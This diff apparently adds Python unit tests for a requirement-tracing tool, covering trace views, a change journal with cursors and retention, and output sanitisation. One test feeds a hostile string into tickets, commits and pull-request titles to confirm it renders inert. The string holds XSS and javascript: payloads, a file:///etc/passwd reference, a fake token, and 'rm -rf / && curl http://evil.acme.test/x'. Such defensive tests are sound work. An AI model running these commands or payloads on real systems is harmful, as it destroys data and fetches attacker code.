@@ -222,12 +222,226 @@ class SideEffects(ViewBase):
             for _ in range(5):
                 self.read()
                 self.read(privacy=True)
+                self.read(view="trace", requirement="ac1", workflow=self.rec["id"], history=True)
+                self.read(view="changes")
+                gv.render_text(self.read(view="changes", since=0))
                 with self.without(self.repo_b):
                     self.read()
+                    self.read(view="trace", requirement="R1")
         self.assertEqual(calls, [])
         self.assertEqual(self.processes, [])
         gs.reset()
         self.assertEqual(everything(common.home()), before)
+
+
+FILTER2 = "Orders can be filtered by status and by date"
+FAKE_TOKEN = "gh" + "p_" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ab"   # assembled here so no token-shaped literal is committed
+EVIL = ("Bad \x1b[31m\x07 <script>alert(1)</script> [x](javascript:alert(1)) file:///etc/passwd "
+        + FAKE_TOKEN + "; rm -rf / && curl http://evil.acme.test/x")
+
+
+class Trace(ViewBase):
+    def edges_are_inside(self, out, view):
+        """Every reaching edge is a visible edge whose two endpoints are visible nodes."""
+        edges = {e["id"]: e for e in view["edges"]}
+        for item in out["items"]:
+            self.assertIn(item["node"]["id"], view["nodes"])
+            if item["edge"]:
+                edge = edges[item["edge"]["id"]]
+                self.assertTrue(edge["src"] in view["nodes"] and edge["dst"] in view["nodes"])
+                self.assertEqual(edge["dst"], item["node"]["id"])
+
+    def test_layers_in_order_with_their_edges(self):
+        self.rec = self.map(self.rec, evidence="commit:" + fx.sha(1), criteria=["ac1"])
+        self.sync()
+        out = self.read(view="trace", requirement="ac1")
+        self.assertEqual((out["operation"], out["requirement"]["alias"], out["requirement"]["text"]),
+                         ("graph_trace", "ac1", FILTER))
+        layers = [i["layer"] for i in out["items"]]
+        order = list(gv.LAYERS) + ["ticket evidence"]
+        self.assertEqual(layers, sorted(layers, key=order.index))
+        by_layer = {}
+        for item in out["items"]:
+            by_layer.setdefault(item["layer"], []).append(item)
+        self.assertTrue(by_layer["plan steps"] and by_layer["commits"] and by_layer["tests and runs"])
+        commit = by_layer["commits"][0]
+        self.assertEqual((commit["edge"]["type"], commit["edge"]["basis"]), ("IMPLEMENTED_BY", "declared"))
+        self.assertTrue(commit["edge"]["declarations"])
+        run = [i for i in by_layer["tests and runs"] if i["edge"]["type"] == "SUPPORTED_BY"][0]
+        self.assertEqual(run["edge"]["applicability"], "current")
+        self.assertEqual(out["totals"]["commits"], len(by_layer["commits"]))
+        self.assertEqual(sum(out["totals"].values()), out["total"])
+        scope = gv._scope(A, self.cfg)
+        self.edges_are_inside(out, gv._filtered(scope["rows"], scope))
+        declared = self.read(view="trace", requirement="ac1", basis="observed")
+        self.assertFalse([i for i in declared["items"] if i["edge"] and i["edge"]["type"] in gv.LINKS])
+
+    def test_a_trace_never_reaches_a_filtered_endpoint(self):
+        other = self.second()
+        self.rec = self.map(self.rec, evidence="commit:" + fx.sha(1), criteria=["ac1"])
+        self.sync()
+        with self.without(self.repo_b):
+            out = self.read(view="trace", requirement="ac1")
+            scope = gv._scope(A, self.cfg)
+            view = gv._filtered(scope["rows"], scope)
+        self.assertNotIn(other["id"], json.dumps(out))
+        self.edges_are_inside(out, view)
+        full = self.read(view="trace", requirement="ac1", workflow=other["id"])
+        self.assertIn(other["id"], json.dumps(full))
+
+    def test_history_shows_earlier_wording(self):
+        self.sync()
+        fx.write_card(common.home(), A, [FILTER2, EXPORT])
+        self.sync()
+        now = self.read(view="trace", requirement="R1")
+        self.assertEqual([r["text"] for r in now["requirement"]["revisions"]], [FILTER2])
+        old = self.read(view="trace", requirement="R1", history=True)
+        self.assertEqual(sorted(r["text"] for r in old["requirement"]["revisions"]), sorted([FILTER, FILTER2]))
+        self.assertEqual(len(old["requirement"]["supersedes"]), 1)
+        self.assertEqual([o["event"] for o in old["requirement"]["occurrences"]], ["added", "modified"])
+
+    def test_a_requirement_is_required_and_must_be_visible(self):
+        self.sync()
+        with self.assertRaises(ValueError):
+            self.read(view="trace")
+        with self.assertRaises(ValueError):
+            self.read(view="trace", requirement="ac9")
+        with self.assertRaises(ValueError):
+            self.read(view="trace", requirement="gr_" + "0" * 24)
+
+    def test_an_old_cursor_asks_for_a_reload(self):
+        self.sync()
+        gen = profile.signature(self.cfg)
+        ref = gv._cursor_ref("trace", {"ticket": A, "requirement": "ac1"})
+        token = gv.cv.make_cursor("trace", ref, 1, gen, 1)
+        self.assertEqual(self.read(view="trace", requirement="ac1", cursor=token)["offset"], 1)
+        for changed in ({"basis": "declared"}, {"history": True}, {"requirement": "R1"}, {"since": 1}):
+            with self.subTest(changed=changed):
+                with self.assertRaises(ValueError):
+                    self.read(**dict({"view": "trace", "requirement": "ac1", "cursor": token}, **changed))
+        with self.assertRaises(ValueError):   # another profile generation
+            self.read(view="trace", requirement="ac1", cursor=gv.cv.make_cursor("trace", ref, 1, "other", 1))
+        commits = dict(self.tk(A)["commits"])
+        extra = fx.commit_rec(2, "ABC-1001 Second change", repo="scratch")
+        commits[extra["sha"]] = extra
+        self.put(A, commits=commits)
+        self.sync()   # another snapshot
+        with self.assertRaises(ValueError):
+            self.read(view="trace", requirement="ac1", cursor=token)
+
+
+class Changes(ViewBase):
+    def add_commit(self, n, subject):
+        commits = dict(self.tk(A)["commits"])
+        extra = fx.commit_rec(n, subject, repo="scratch", files=["src/orders/c%d.py" % n])
+        commits[extra["sha"]] = extra
+        self.put(A, commits=commits)
+        return extra
+
+    def test_a_new_commit_is_new_implementation_evidence(self):
+        self.sync()
+        first = self.read(view="changes")
+        self.assertEqual((first["baseline"], first["from"], first["to"], first["entries"]), ("ok", 0, 1, 1))
+        extra = self.add_commit(2, "ABC-1001 Add the order export")
+        self.sync()
+        out = self.read(view="changes")
+        self.assertEqual((out["baseline"], out["from"], out["to"], out["entries"]), ("ok", 1, 2, 1))
+        impl = [i for i in out["items"] if i["category"] == "implementation"]
+        self.assertEqual([i["label"] for i in impl if i["kind"] == "commit"], ["ABC-1001 Add the order export"])
+        self.assertEqual(out["totals"]["implementation"], len(impl))
+        self.assertEqual(self.read(view="changes", since=2)["entries"], 0)
+        hidden = self.read(view="changes", privacy=True)
+        self.assertNotIn("Add the order export", json.dumps(hidden))
+        self.assertIn(extra["sha"][:9], json.dumps(hidden))
+        self.assertIn("implementation: commit", gv.render_text(out))
+
+    def test_status_transitions_and_gaps(self):
+        self.sync()
+        self.rec = self.map(self.rec, evidence="commit:" + fx.sha(1), criteria=["ac1"], steps=["one"])
+        self.sync()
+        out = self.read(view="changes")
+        status = [i for i in out["items"] if i["category"] == "status" and i["kind"] == "implementation"]
+        self.assertTrue(status)
+        self.assertTrue(any(i["to"] == "Linked" for i in status))
+        self.assertTrue([i for i in out["items"] if i["category"] == "gaps" and i["state"] == "closed"])
+
+    def test_profile_change_makes_earlier_changes_unavailable(self):   # EG-A18 rest
+        self.sync()
+        self.add_commit(2, "ABC-1001 Add the order export")
+        self.sync()
+        cfg = json.loads(json.dumps(self.cfg))
+        cfg["profile"]["include_tickets"]["ABC-1003"] = "Third task"
+        fx_write_config(cfg)
+        self.assertEqual(self.read(view="changes")["graph"]["state"], "rebuilding")
+        gs.sync(cfg)
+        for since in (None, 1, 0):
+            with self.subTest(since=since):
+                out = self.read(view="changes", **({} if since is None else {"since": since}))
+                self.assertEqual(out["baseline"], "unavailable")
+                self.assertIn("profile", out["reason"])
+                self.assertEqual(out["items"], [])
+                self.assertIn("counts", out["current"])   # the current authorized state, said plainly
+
+    def test_unknown_dropped_and_reset_sequences(self):
+        self.sync()
+        out = self.read(view="changes", since=99)
+        self.assertEqual((out["baseline"], out["reason"]), ("unavailable", "unknown sequence"))
+        journal = [{"seq": 5, "prev": None, "baseline": "reset", "delta": {}}, {"seq": 6, "prev": 5, "delta": {}}]
+        self.assertEqual(gv._since(journal, 2), (None, "dropped by retention"))
+        self.assertEqual(gv._since(journal, 0), (None, "dropped by retention"))
+        self.assertEqual(gv._since(journal, None), (5, None))
+        self.assertEqual(gv._since(journal[:1], None), (None, "reset by recovery"))
+
+    def test_a_200_entry_journal_folds_within_bounds(self):
+        self.sync()
+        path = gs.history_path(A)
+        data = gs.load_history(A)[1]
+        head = data["journal"][0]
+        first = sum(1 for row in head["delta"]["evidence"]["added"] if row[1] in ("commit", "code_change"))
+        for seq in range(2, 201):
+            data["journal"].append({"seq": seq, "prev": seq - 1, "at": head["at"], "content": head["content"],
+                                    "profile_generation": head["profile_generation"],
+                                    "delta": {"requirements": {}, "source": None, "more": 0, "status": [],
+                                              "evidence": {"added": [["gm_%024x" % seq, "commit", "", ""]],
+                                                           "removed": [], "changed": []}}})
+        data["head"] = dict(data["head"], seq=200)
+        data["next_seq"] = 201
+        common.write_json(path, data)
+        out, seen = self.read(view="changes", since=0), []
+        self.assertEqual((out["entries"], out["from"], out["to"]), (200, 0, 200))
+        self.assertEqual(out["totals"]["implementation"], 199 + first)
+        while True:
+            self.assertLessEqual(len(json.dumps(out).encode()), gv.cv.MAX_BYTES)
+            self.assertLessEqual(len(out["items"]), gv.PAGE_SIZE)
+            seen += [(i["category"], i.get("id"), i.get("kind"), i["seq"]) for i in out["items"]]
+            if not out["next_cursor"]:
+                break
+            out = self.read(view="changes", since=0, cursor=out["next_cursor"])
+        self.assertEqual(len(seen), out["total"])
+        self.assertEqual(len(set(seen)), out["total"])
+        self.assertEqual(seen[0][3], 200)   # newest first
+
+
+class Untrusted(ViewBase):
+    def test_hostile_text_is_inert_everywhere(self):   # EG-A19
+        fx.write_card(common.home(), A, [FILTER, EXPORT, EVIL])
+        commits = {c["sha"]: c for c in [fx.commit_rec(1, "ABC-1001 " + EVIL, repo="scratch", files=["src/orders/list.py"])]}
+        pr = dict(fx.pull_request(7, head=fx.sha(1)), title=EVIL)
+        self.put(A, commits=commits, git={"repos": {"scratch": {"prs": [pr], "branches": [], "rows": []}}})
+        self.sync()
+        outs = [self.read(), self.read(view="trace", requirement="R3", history=True),
+                self.read(view="trace", requirement="ac1"), self.read(view="changes", since=0)]
+        texts = [json.dumps(o) for o in outs] + [gv.render_text(o) for o in outs]
+        found = "".join(texts)
+        self.assertIn("rm -rf", found)   # the text is there, as plain text
+        for bad in ("\x1b", "\x07", "\\u001b", "\\u0007", "javascript:", "file://", "http://evil", FAKE_TOKEN[:4],
+                    FAKE_TOKEN[4:]):
+            with self.subTest(bad=bad):
+                self.assertNotIn(bad, found)
+        trace = outs[1]
+        self.assertIn("[link]", trace["requirement"]["text"])
+        labels = [i["node"]["label"] for i in outs[2]["items"] if i["node"]["type"] in ("commit", "pull_request")]
+        self.assertTrue(labels and all("[link]" in label or "[GITHUB-TOKEN]" in label for label in labels))
 
 
 def fx_write_config(cfg):
